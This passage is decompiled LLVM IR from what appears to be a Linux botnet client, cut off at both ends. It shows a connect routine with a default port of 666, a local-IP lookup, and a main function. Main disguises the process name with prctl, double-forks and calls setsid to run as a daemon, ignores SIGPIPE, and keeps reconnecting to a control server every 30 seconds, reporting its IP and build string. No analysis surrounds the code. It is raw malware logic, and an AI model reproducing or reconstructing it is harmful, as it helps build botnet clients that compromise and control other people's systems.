  %v1_804cd71 = add i32 %v0_804cd57, 1
  br label %dec_label_pc_804cd77

dec_label_pc_804cd77:                             ; preds = %dec_label_pc_804cd57, %dec_label_pc_804cd6c
  %storemerge = phi i32 [ %v1_804cd71, %dec_label_pc_804cd6c ], [ 0, %dec_label_pc_804cd57 ]
  store i32 %storemerge, i32* @global_var_8058144.119, align 4
  %v1_804cd7c = mul i32 %storemerge, 4
  %v2_804cd7c = add i32 %v1_804cd7c, ptrtoint ([21 x i8]** @global_var_80580d0.121 to i32)
  %v3_804cd7c = inttoptr i32 %v2_804cd7c to i32*
  %v4_804cd7c = load i32, i32* %v3_804cd7c, align 4
  store i32 %v4_804cd7c, i32* @eax, align 4
  %v3_804cd90 = call i32 @strcpy(i8* %v3_804cd32, i32 %v4_804cd7c)
  %v3_804cdad = call i32 @__GI_strchr(i8* %v3_804cd32, i32 58)
  %v1_804cdb2 = icmp eq i32 %v3_804cdad, 0
  br i1 %v1_804cdb2, label %dec_label_pc_804cdf1, label %dec_label_pc_804cdb6

dec_label_pc_804cdb6:                             ; preds = %dec_label_pc_804cd77
  %v3_804cdc7 = call i32 @__GI_strchr(i8* %v3_804cd32, i32 58)
  %v1_804cdcc = add i32 %v3_804cdc7, 1
  %v1_804cdd0 = call i32 @atol(i32 %v1_804cdcc)
  %v3_804cde9 = call i32 @__GI_strchr(i8* %v3_804cd32, i32 58)
  %v4_804cde9 = inttoptr i32 %v3_804cde9 to i8*
  store i8 0, i8* %v4_804cde9, align 1
  br label %dec_label_pc_804cdf1

dec_label_pc_804cdf1:                             ; preds = %dec_label_pc_804cd77, %dec_label_pc_804cdb6
  %stack_var_-8.0 = phi i32 [ 666, %dec_label_pc_804cd77 ], [ %v1_804cdd0, %dec_label_pc_804cdb6 ]
  %v3_804ce08 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804ce08, i32* @global_var_80584c0.18, align 64
  %v4_804ce34 = call i32 @connectTimeout(i32 %v3_804ce08, i32 %v2_804cd16, i32 %stack_var_-8.0, i32 30)
  %v1_804ce39 = icmp eq i32 %v4_804ce34, 0
  %. = zext i1 %v1_804ce39 to i32
  %v2_804ce59 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ce59, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804cdf1, { 1, 0 }
  uselistorder label %dec_label_pc_804cd77, { 1, 0 }
  uselistorder label %dec_label_pc_804cd57, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce5b = load i32, i32* @ebp, align 4
  store i32 %v0_804ce5b, i32* %stack_var_-4, align 4
  %v5_804ce7b = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804ce83 = icmp eq i32 %v5_804ce7b, -1
  %v1_804ce87 = icmp eq i1 %v13_804ce83, false
  br i1 %v1_804ce87, label %dec_label_pc_804ce98, label %dec_label_pc_804d076

dec_label_pc_804ce98:                             ; preds = %entry
  %v2_804ce98 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804cec3 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_805605f.122 to i32))
  %v3_804ced2 = call i32 @htons(i16 53)
  %v5_804cef3 = call i32 @__libc_connect(i32 %v5_804ce7b, i32 %v2_804ce98, i32 16)
  %v13_804cefb = icmp eq i32 %v5_804cef3, -1
  %v1_804ceff = icmp eq i1 %v13_804cefb, false
  br i1 %v1_804ceff, label %dec_label_pc_804cf10, label %dec_label_pc_804d076

dec_label_pc_804cf10:                             ; preds = %dec_label_pc_804ce98
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804cf17 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804cf1a = ptrtoint i32* %stack_var_-60 to i32
  %v5_804cf2b = call i32 @__GI_getsockname(i32 %v5_804ce7b, i32 %v2_804cf17, i32 %v2_804cf1a)
  %v13_804cf33 = icmp eq i32 %v5_804cf2b, -1
  %v1_804cf37 = icmp eq i1 %v13_804cf33, false
  br i1 %v1_804cf37, label %dec_label_pc_804cf48, label %dec_label_pc_804d076

dec_label_pc_804cf48:                             ; preds = %dec_label_pc_804cf10
  %v5_804cf5f = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8056067.123, i32 0, i32 0), i32 0)
  %v2_804cfc4 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804cfdc34 = call i32 @fdgets(i32 %v2_804cfc4, i32 4096, i32 %v5_804cf5f)
  %v1_804cfe135 = icmp eq i32 %v5_804cfdc34, 0
  %v1_804cfe337 = icmp eq i1 %v1_804cfe135, false
  br i1 %v1_804cfe337, label %dec_label_pc_804cf69, label %dec_label_pc_804cfe5

dec_label_pc_804cf69:                             ; preds = %dec_label_pc_804cf48, %dec_label_pc_804cfa3
  %v5_804cf7a = call i32 @strstr(i32 %v2_804cfc4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056077.124, i32 0, i32 0))
  %v1_804cf7f = icmp eq i32 %v5_804cf7a, 0
  br i1 %v1_804cf7f, label %dec_label_pc_804cfa3, label %dec_label_pc_804cf91

dec_label_pc_804cf8e:                             ; preds = %dec_label_pc_804cf91
  %v4_804cf91 = ptrtoint i8* %storemerge5 to i32
  %v5_804cf8e = add i32 %v4_804cf91, 1
  %v22_804cf8e = inttoptr i32 %v5_804cf8e to i8*
  br label %dec_label_pc_804cf91

dec_label_pc_804cf91:                             ; preds = %dec_label_pc_804cf69, %dec_label_pc_804cf8e
  %storemerge5 = phi i8* [ %v22_804cf8e, %dec_label_pc_804cf8e ], [ %stack_var_-4156, %dec_label_pc_804cf69 ]
  %v2_804cf94 = load i8, i8* %storemerge5, align 1
  %v10_804cf97 = icmp eq i8 %v2_804cf94, 9
  %v1_804cf99 = icmp eq i1 %v10_804cf97, false
  br i1 %v1_804cf99, label %dec_label_pc_804cf8e, label %dec_label_pc_804cf9b

dec_label_pc_804cf9b:                             ; preds = %dec_label_pc_804cf91
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_804cfe5

dec_label_pc_804cfa3:                             ; preds = %dec_label_pc_804cf69
  %v6_804cfbf = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804cfdc = call i32 @fdgets(i32 %v2_804cfc4, i32 4096, i32 %v5_804cf5f)
  %v1_804cfe1 = icmp eq i32 %v5_804cfdc, 0
  %v1_804cfe3 = icmp eq i1 %v1_804cfe1, false
  br i1 %v1_804cfe3, label %dec_label_pc_804cf69, label %dec_label_pc_804cfe5

dec_label_pc_804cfe5:                             ; preds = %dec_label_pc_804cf48, %dec_label_pc_804cfa3, %dec_label_pc_804cf9b
  %v2_804cfeb = call i32 @__libc_close(i32 %v5_804cf5f)
  %v3_804cff0 = load i8, i8* %stack_var_-4156, align 1
  %v4_804cff7 = icmp eq i8 %v3_804cff0, 0
  br i1 %v4_804cff7, label %dec_label_pc_804d05d, label %dec_label_pc_804cffb

dec_label_pc_804cffb:                             ; preds = %dec_label_pc_804cfe5
  %v2_804d005 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804d005, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804d00e = call i32 @strcpy(i8* %tmp32, i32 %v2_804cfc4)
  %v5_804d02b = call i32 @ioctl(i32 %v5_804ce7b, i32 35111, i32 %v2_804d005)
  %v2_804d042 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804d039

dec_label_pc_804d039:                             ; preds = %dec_label_pc_804cffb, %dec_label_pc_804d039
  %storemerge33 = phi i32 [ 0, %dec_label_pc_804cffb ], [ %v4_804d054, %dec_label_pc_804d039 ]
  %v2_804d048 = add i32 %storemerge33, %v2_804d042
  %v1_804d04b = inttoptr i32 %v2_804d048 to i8*
  %v2_804d04b = load i8, i8* %v1_804d04b, align 1
  %v3_804d04e = add i32 %storemerge33, ptrtoint (i8** @global_var_80584d0.125 to i32)
  %v4_804d04e = inttoptr i32 %v3_804d04e to i8*
  store i8 %v2_804d04b, i8* %v4_804d04e, align 1
  %v4_804d054 = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_804d054, 6
  br i1 %exitcond, label %dec_label_pc_804d05d, label %dec_label_pc_804d039

dec_label_pc_804d05d:                             ; preds = %dec_label_pc_804d039, %dec_label_pc_804cfe5
  %v2_804d063 = call i32 @__libc_close(i32 %v5_804ce7b)
  br label %dec_label_pc_804d076

dec_label_pc_804d076:                             ; preds = %entry, %dec_label_pc_804ce98, %dec_label_pc_804cf10, %dec_label_pc_804d05d
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_804d05d ], [ 0, %dec_label_pc_804cf10 ], [ 0, %dec_label_pc_804ce98 ], [ 0, %entry ]
  %v2_804d07c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d07c, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_804cfc4, { 1, 3, 2, 0 }
  uselistorder i32 %v5_804cf5f, { 1, 2, 0 }
  uselistorder i32 %v5_804ce7b, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i16)* @htons, { 8, 1, 2, 3, 4, 5, 6, 0, 7, 9, 10, 11 }
  uselistorder label %dec_label_pc_804d076, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d039, { 1, 0 }
  uselistorder label %dec_label_pc_804cfe5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cf91, { 1, 0 }
  uselistorder label %dec_label_pc_804cf69, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_8056082.126 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804d088 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804d088, i32* %stack_var_-24, align 4
  %v5_804d099 = icmp ult i32* %stack_var_-24, inttoptr (i32 5864 to i32*)
  store i1 %v5_804d099, i1* %cf.global-to-local, align 1
  %v1_804d0b2 = add i32 %v2_804d088, 4
  %v2_804d0b2 = inttoptr i32 %v1_804d0b2 to i32*
  %v3_804d0b2 = load i32, i32* %v2_804d0b2, align 4
  %v1_804d0b5 = inttoptr i32 %v3_804d0b2 to i32*
  %v2_804d0b5 = load i32, i32* %v1_804d0b5, align 4
  store i1 false, i1* @df, align 1
  %v4_804d0c5 = inttoptr i32 %v2_804d0b5 to i8*
  store i32 %v2_804d0b5, i32* @edi, align 4
  %v3_804d0cb = call i32 @_strlen(i8* %v4_804d0c5)
  %v3_804d0da = load i32, i32* %v2_804d0b2, align 4
  %v1_804d0dd = inttoptr i32 %v3_804d0da to i32*
  %v2_804d0dd = load i32, i32* %v1_804d0dd, align 4
  store i32 %v2_804d0dd, i32* %stack_var_-5888, align 4
  %v4_804d0ee = inttoptr i32 %v2_804d0dd to i8*
  %v5_804d0ee = call i32 @strncpy(i8* %v4_804d0ee, i32 ptrtoint (i32* @global_var_8056089.127 to i32), i32 %v3_804d0cb)
  store i32 %v2_804d088, i32* @esi, align 4
  %v3_804d0fe = load i32, i32* %v2_804d0b2, align 4
  %v2_804d101 = inttoptr i32 %v3_804d0fe to i32*
  store i32 ptrtoint (i32* @global_var_8056089.127 to i32), i32* %v2_804d101, align 4
  store i32 15, i32* %stack_var_-5888, align 4
  %v6_804d129 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_8056089.127 to i32), i32 0, i32 0, i32 0)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_804d135 = call i32 @__GI_time(i32* null)
  store i32 %v2_804d135, i32* @ebx, align 4
  %v0_804d13c = call i32 @__libc_getpid()
  %v1_804d141 = load i32, i32* @ebx, align 4
  %v2_804d141 = xor i32 %v1_804d141, %v0_804d13c
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804d141, i32* @eax, align 4
  store i32 %v2_804d141, i32* %stack_var_-5888, align 4
  %v1_804d146 = call i32 @srand(i32 %v2_804d141)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_804d152 = call i32 @__GI_time(i32* null)
  store i32 %v2_804d152, i32* @ebx, align 4
  %v0_804d159 = call i32 @__libc_getpid()
  %v1_804d15e = load i32, i32* @ebx, align 4
  %v2_804d15e = xor i32 %v1_804d15e, %v0_804d159
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804d15e, i32* %stack_var_-5888, align 4
  %v1_804d163 = call i32 @init_rand(i32 %v2_804d15e)
  store i32 ptrtoint ([19 x i8]* @global_var_805608a.128 to i32), i32* @eax, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_805608a.128 to i32), i32* %stack_var_-5888, align 4
  %v3_804d184 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_805608a.128 to i32), i32 ptrtoint ([2 x i8]* @global_var_805609d.129 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d18c = icmp eq i32 %v3_804d184, 0
  %v1_804d190 = icmp eq i1 %v4_804d18c, false
  br i1 %v1_804d190, label %dec_label_pc_804d1af, label %dec_label_pc_804d192

dec_label_pc_804d192:                             ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_805609f.130 to i32), i32* @eax, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_805609f.130 to i32), i32* %stack_var_-5888, align 4
  %v3_804d1a7 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_805609f.130 to i32), i32 ptrtoint ([2 x i8]* @global_var_805609d.129 to i32))
  br label %dec_label_pc_804d1af

dec_label_pc_804d1af:                             ; preds = %entry, %dec_label_pc_804d192
  %stack_var_-88.0 = phi i32 [ %v3_804d184, %entry ], [ %v3_804d1a7, %dec_label_pc_804d192 ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_805608a.128, i32 0, i32 0), %entry ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805609f.130, i32 0, i32 0), %dec_label_pc_804d192 ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d1af = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804d1af, label %dec_label_pc_804d351, label %dec_label_pc_804d1b9

dec_label_pc_804d1b9:                             ; preds = %dec_label_pc_804d1af
  %v3_804d1bf = load i32, i32* %v2_804d0b2, align 4
  %v1_804d1c2 = inttoptr i32 %v3_804d1bf to i32*
  %v2_804d1c2 = load i32, i32* %v1_804d1c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804d1d2 = inttoptr i32 %v2_804d1c2 to i8*
  store i32 %v2_804d1c2, i32* @edi, align 4
  %v3_804d1d8 = call i32 @_strlen(i8* %v4_804d1d2)
  %v2_804d1f1 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804d1f1, i32* %stack_var_-5888, align 4
  %v3_804d1fa = call i32 @getcwd(i32 %v2_804d1f1, i32 256)
  store i1 false, i1* @df, align 1
  %v4_804d220 = bitcast i32* %stack_var_-368 to i8*
  store i32 %v2_804d1f1, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_80560ac.131 to i32), i32* @edi, align 4
  %v7_804d232 = call i32 @_strncmp(i8* %v4_804d220, i8* bitcast (i8** @global_var_80560ac.131 to i8*), i32 2)
  %v8_804d232 = urem i32 %v7_804d232, 2
  %v9_804d232 = icmp eq i32 %v8_804d232, 0
  %v0_804d234 = load i1, i1* @cf, align 1
  %v2_804d234 = or i1 %v0_804d234, %v9_804d232
  %v3_804d234 = zext i1 %v2_804d234 to i8
  %v7_804d234 = xor i8 %v3_804d234, 1
  %v5_804d237 = ptrtoint i32* %stack_var_-512 to i32
  %v3_804d23a = and i32 %v7_804d232, -256
  %v3_804d23c = trunc i32 %v5_804d237 to i8
  %v4_804d23c = sub i8 %v7_804d234, %v3_804d23c
  %v15_804d23c = icmp eq i8 %v4_804d23c, 0
  %v20_804d23c = zext i8 %v4_804d23c to i32
  %v23_804d23c = or i32 %v20_804d23c, %v3_804d23a
  store i32 %v23_804d23c, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804d23c, label %dec_label_pc_804d346, label %dec_label_pc_804d250

dec_label_pc_804d24d:                             ; preds = %dec_label_pc_804d250
  %v4_804d24d = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804d250

dec_label_pc_804d250:                             ; preds = %dec_label_pc_804d1b9, %dec_label_pc_804d24d
  %stack_var_-84.0 = phi i32 [ %v4_804d24d, %dec_label_pc_804d24d ], [ %v3_804d1d8, %dec_label_pc_804d1b9 ]
  store i32 %v2_804d088, i32* @esi, align 4
  %v3_804d256 = load i32, i32* %v2_804d0b2, align 4
  %v1_804d259 = inttoptr i32 %v3_804d256 to i32*
  %v2_804d259 = load i32, i32* %v1_804d259, align 4
  %v2_804d25e = add i32 %v2_804d259, %stack_var_-84.0
  %v1_804d261 = inttoptr i32 %v2_804d25e to i8*
  %v2_804d261 = load i8, i8* %v1_804d261, align 1
  %v6_804d264 = icmp ult i8 %v2_804d261, 47
  store i1 %v6_804d264, i1* %cf.global-to-local, align 1
  %v10_804d264 = icmp eq i8 %v2_804d261, 47
  %v1_804d266 = icmp eq i1 %v10_804d264, false
  br i1 %v1_804d266, label %dec_label_pc_804d24d, label %dec_label_pc_804d268

dec_label_pc_804d268:                             ; preds = %dec_label_pc_804d250
  store i32 %v2_804d088, i32* @edi, align 4
  %v3_804d26e = load i32, i32* %v2_804d0b2, align 4
  %v1_804d271 = inttoptr i32 %v3_804d26e to i32*
  %v2_804d271 = load i32, i32* %v1_804d271, align 4
  %v2_804d276 = add i32 %v2_804d271, %stack_var_-84.0
  %v2_804d28f = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804d28f, i32* %stack_var_-5888, align 4
  %v5_804d298 = call i32 @sprintf(i32 %v2_804d28f, i32 ptrtoint ([8 x i8]* @global_var_80560ae.132 to i32), i32 %v2_804d1f1, i32 %v2_804d276)
  %v1_804d2e1 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_804d2ae = ptrtoint i32* %stack_var_-1648 to i32
  %v3_804d2cf = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_804d2db.outer

dec_label_pc_804d29f:                             ; preds = %dec_label_pc_804d2db
  store i32 %v2_804d2ae, i32* %stack_var_-5888, align 4
  %v4_804d2b7 = call i32 @fgets(i32 %v2_804d2ae, i32 1024, i32 %stack_var_-88.0)
  store i32 %v2_804d2ae, i32* %stack_var_-5888, align 4
  %v4_804d2cf = call i32 @__GI_strcasecmp(i8* %v3_804d2cf, i32 %v2_804d28f)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d2d4 = icmp eq i32 %v4_804d2cf, 0
  %v1_804d2d6 = icmp eq i1 %v1_804d2d4, false
  br i1 %v1_804d2d6, label %dec_label_pc_804d2db, label %dec_label_pc_804d2d8

dec_label_pc_804d2d8:                             ; preds = %dec_label_pc_804d29f
  %v4_804d2d8 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804d2db.outer

dec_label_pc_804d2db.outer:                       ; preds = %dec_label_pc_804d2d8, %dec_label_pc_804d268
  %stack_var_-80.0.ph = phi i32 [ %v4_804d2d8, %dec_label_pc_804d2d8 ], [ 0, %dec_label_pc_804d268 ]
  br label %dec_label_pc_804d2db

dec_label_pc_804d2db:                             ; preds = %dec_label_pc_804d2db.outer, %dec_label_pc_804d29f
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_804d2e1 = call i32 @feof(i16* %v1_804d2e1)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d2e6 = icmp eq i32 %v2_804d2e1, 0
  br i1 %v1_804d2e6, label %dec_label_pc_804d29f, label %dec_label_pc_804d2ea

dec_label_pc_804d2ea:                             ; preds = %dec_label_pc_804d2db
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d2ea = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804d2ee = icmp eq i1 %v4_804d2ea, false
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_804d33f = call i32 @__GI_fclose(i16* %v1_804d2e1)
  br i1 %v1_804d2ee, label %dec_label_pc_804d351, label %dec_label_pc_804d2f0

dec_label_pc_804d2f0:                             ; preds = %dec_label_pc_804d2ea
  %v4_804d303 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_804d303, i32* @eax, align 4
  store i32 %v4_804d303, i32* %stack_var_-5888, align 4
  %v3_804d309 = call i32 @__GI_fopen(i32 %v4_804d303, i32 ptrtoint (i32* @global_var_80560b6.133 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d311 = icmp eq i32 %v3_804d309, 0
  br i1 %v4_804d311, label %dec_label_pc_804d351, label %dec_label_pc_804d317

dec_label_pc_804d317:                             ; preds = %dec_label_pc_804d2f0
  store i32 %v2_804d28f, i32* %stack_var_-5888, align 4
  %v3_804d327 = call i32 @__GI_fputs(i32 %v2_804d28f, i32 %v3_804d309)
  store i32 %v3_804d309, i32* @eax, align 4
  store i32 %v3_804d309, i32* %stack_var_-5888, align 4
  %v1_804d332 = inttoptr i32 %v3_804d309 to i16*
  %v2_804d332 = call i32 @__GI_fclose(i16* %v1_804d332)
  br label %dec_label_pc_804d351

dec_label_pc_804d346:                             ; preds = %dec_label_pc_804d1b9
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v1_804d34c = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_804d34c = call i32 @__GI_fclose(i16* %v1_804d34c)
  br label %dec_label_pc_804d351

dec_label_pc_804d351:                             ; preds = %dec_label_pc_804d2ea, %dec_label_pc_804d2f0, %dec_label_pc_804d1af, %dec_label_pc_804d317, %dec_label_pc_804d346
  %v0_804d351 = call i32 @getOurIP()
  %v0_804d356 = load i32, i32* %stack_var_-5888, align 4
  %v1_804d356 = call i32 @__libc_fork(i32 %v0_804d356)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d35e = icmp eq i32 %v1_804d356, 0
  br i1 %v4_804d35e, label %dec_label_pc_804d390, label %dec_label_pc_804d3bf

dec_label_pc_804d390:                             ; preds = %dec_label_pc_804d351
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804d390 = load i32, i32* %stack_var_-5888, align 4
  %v1_804d390 = call i32 @__libc_fork(i32 %v0_804d390)
  store i32 %v1_804d390, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d398 = icmp eq i32 %v1_804d390, 0
  br i1 %v4_804d398, label %dec_label_pc_804d3aa.thread, label %dec_label_pc_804d3b0

dec_label_pc_804d3aa.thread:                      ; preds = %dec_label_pc_804d390
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d3cc

dec_label_pc_804d3b0:                             ; preds = %dec_label_pc_804d390
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d3a5 = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_80560b8.134 to i32), i32* %stack_var_-5888, align 4
  %v1_804d3b8 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_80560b8.134 to i32))
  br label %dec_label_pc_804d3cc

dec_label_pc_804d3bf:                             ; preds = %dec_label_pc_804d351
  %v2_804d36c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v1_804d356, i32* %stack_var_-5888, align 4
  %v4_804d379 = call i32 @__libc_waitpid(i32 %v1_804d356, i32 %v2_804d36c, i32 0)
  store i32 %v4_804d379, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d385 = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_80560b8.134 to i32), i32* %stack_var_-5888, align 4
  %v1_804d3c7 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_80560b8.134 to i32))
  br label %dec_label_pc_804d3cc

dec_label_pc_804d3cc:                             ; preds = %dec_label_pc_804d3aa.thread, %dec_label_pc_804d3b0, %dec_label_pc_804d3bf
  %v0_804d3cc = call i32 @__GI_setsid()
  store i32 ptrtoint (i8** @global_var_80560ac.131 to i32), i32* %stack_var_-5888, align 4
  %v1_804d3d8 = call i32 @chdir(i32 ptrtoint (i8** @global_var_80560ac.131 to i32))
  store i32 13, i32* %stack_var_-5888, align 4
  %v3_804d3ec = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_804da73 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp121 = bitcast i32* %stack_var_-5744 to i8*
  %tmp122 = bitcast i8** %stack_var_-36 to i32*
  %v2_804d882 = ptrtoint i32* %stack_var_-1648 to i32
  %v4_804d89e = bitcast i32* %stack_var_-1648 to i8*
  %v1_804d6ff = or i32 %v2_804da73, 1
  %storemerge13127 = inttoptr i32 %v1_804d6ff to i8*
  br label %dec_label_pc_804d3f3.outer

dec_label_pc_804d3f3.outer:                       ; preds = %dec_label_pc_804d6bf, %dec_label_pc_804da73, %dec_label_pc_804d3cc
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_804d3cc ], [ %stack_var_-96.2.ph, %dec_label_pc_804da73 ], [ %v4_804d6bf, %dec_label_pc_804d6bf ]
  %v0_804d3f324 = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d3f825 = icmp eq i32 %v0_804d3f324, 0
  br i1 %v1_804d3f825, label %dec_label_pc_804d40a, label %dec_label_pc_804d3fc

dec_label_pc_804d3fc:                             ; preds = %dec_label_pc_804d3f3.outer, %dec_label_pc_804d3fc
  store i32 30, i32* %stack_var_-5888, align 4
  %v1_804d403 = call i32 @sleep(i32 30)
  %v0_804d3f3 = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d3f8 = icmp eq i32 %v0_804d3f3, 0
  br i1 %v1_804d3f8, label %dec_label_pc_804d40a, label %dec_label_pc_804d3fc

dec_label_pc_804d40a:                             ; preds = %dec_label_pc_804d3fc, %dec_label_pc_804d3f3.outer
  %v0_804d40a = call i32 @getBuild()
  store i32 %v0_804d40a, i32* @ebx, align 4
  %v0_804d411 = load i32, i32* @global_var_805e748.40, align 8
  store i32 %v0_804d411, i32* %stack_var_-5888, align 4
  %v1_804d419 = call i32 @__GI_inet_ntoa(i32 %v0_804d411)
  %v0_804d41e = load i32, i32* @global_var_80584c0.18, align 64
  %v0_804d424 = load i32, i32* @ebx, align 4
  store i32 %v0_804d41e, i32* %stack_var_-5888, align 4
  %v5_804d437 = call i32 @Rootsprintf(i32 %v0_804d41e, i32 ptrtoint (i32* @global_var_80560c8.135 to i32), i32 %v1_804d419, i32 %v0_804d424)
  br label %dec_label_pc_804da73.outer

dec_label_pc_804d45b:                             ; preds = %dec_label_pc_804d64c, %dec_label_pc_804d604
  %v2_804d45e = mul i32 %storemerge14, 4
  %v9_804d45e = and i32 %storemerge14, 1073741824
  %v10_804d45e = icmp ne i32 %v9_804d45e, 0
  store i1 %v10_804d45e, i1* %cf.global-to-local, align 1
  %v0_804d463 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804d468 = add i32 %v0_804d463, %v2_804d45e
  %v1_804d46b = inttoptr i32 %v2_804d468 to i32*
  %v2_804d46b = load i32, i32* %v1_804d46b, align 4
  store i32 %v2_804d46b, i32* %stack_var_-5888, align 4
  %v4_804d480 = call i32 @__libc_waitpid(i32 %v2_804d46b, i32 0, i32 1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp123 = icmp slt i32 %v4_804d480, 1
  %.pre = add i32 %storemerge14, 1
  br i1 %tmp123, label %dec_label_pc_804d601, label %dec_label_pc_804d48d

dec_label_pc_804d48d:                             ; preds = %dec_label_pc_804d45b
  br label %dec_label_pc_804d4c0

dec_label_pc_804d496:                             ; preds = %dec_label_pc_804d4c0, %dec_label_pc_804d4fa
  %v2_804d499 = mul i32 %storemerge16, 4
  %v0_804d49e = load i32, i32* @global_var_805e754.33, align 4
  %v2_804d4a3 = add i32 %v0_804d49e, %v2_804d499
  %v1_804d4a6 = add i32 %v2_804d4a3, -4
